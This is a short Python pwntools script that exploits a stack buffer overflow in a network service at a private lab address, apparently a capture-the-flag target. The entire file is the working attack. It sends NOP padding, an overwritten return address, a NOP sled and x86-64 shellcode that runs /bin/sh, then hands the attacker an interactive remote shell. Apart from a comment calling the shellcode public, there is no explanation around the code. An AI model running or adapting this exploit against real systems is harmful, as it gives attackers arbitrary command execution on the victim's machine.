from pwn import *
import sys
DEBUG = False
host = "192.168.56.2"
port = 32777
# public shellcode
offset = 48
shellcode='\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05' # /bin/sh
return_address = p64(0x7fffffffe988+128)
# step 1 find vulnerable func
if not DEBUG:
    p = remote(host, port)
    while True:
        p.recvuntil("Captcha:")
        p.recvline()
        break;
    print("send exploit")
    p.sendline('\x90'*offset+return_address+'\x90'*256+shellcode)
    p.interactive()
else:
    print('\x90'*offset+return_address+'\x90'*256+shellcode)
